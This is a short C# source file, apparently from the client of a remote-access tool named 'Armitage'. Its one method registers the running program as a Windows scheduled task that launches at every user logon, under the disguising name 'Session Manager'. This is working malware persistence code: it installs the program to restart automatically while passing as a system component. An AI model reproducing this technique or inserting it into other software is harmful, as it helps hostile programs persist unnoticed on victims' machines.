using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A class containing methods to attach itself at startup.
    /// </summary>
    public static class Startup
    {
        /// <param name="filepath">If null, uses current process' file path.</param>
        public static bool ViaTaskScheduler(string filepath = null) {
            try {
                if (filepath is null) filepath = Constants.MyPath;
                TaskService.Instance.AddTask("Session Manager", QuickTriggerType.Logon, filepath);
            }
            catch {
                return false;
            }
            return true;
        }
    }
}
